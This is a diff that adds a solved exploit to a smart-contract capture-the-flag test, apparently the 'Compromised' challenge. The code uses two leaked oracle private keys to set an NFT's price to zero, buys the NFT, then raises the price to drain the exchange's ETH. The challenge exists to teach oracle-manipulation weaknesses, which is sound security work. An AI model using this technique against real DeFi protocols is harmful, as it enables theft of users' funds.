@@ -61,6 +61,35 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // Private keys recovered from HTTP response
+        const private_keys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
+        const wallets = private_keys.map(key => new ethers.Wallet(key, ethers.provider));
+
+        // Set median price to 0
+        await Promise.all(wallets.map(async (wallet) => {
+            await this.oracle.connect(wallet).postPrice("DVNFT", 0);
+        }));
+
+        // Buy NFT for free
+        const tx = await this.exchange.connect(attacker).buyOne({value: 1});
+        const receipt = await tx.wait();
+        const event = receipt.events.find(event => event.event === "TokenBought");
+        const tokenId = event.args.tokenId;
+
+        // Set median price to EXCHANGE_INITIAL_ETH_BALANCE
+        await Promise.all(wallets.map(async (wallet) => {
+            await this.oracle.connect(wallet).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        }));
+
+        // Sell NFT for max amount
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+
+        // Set back median price to INITIAL_NFT_PRICE
+        await Promise.all(wallets.map(async (wallet) => {
+            await this.oracle.connect(wallet).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }));
     });
 
     after(async function () {
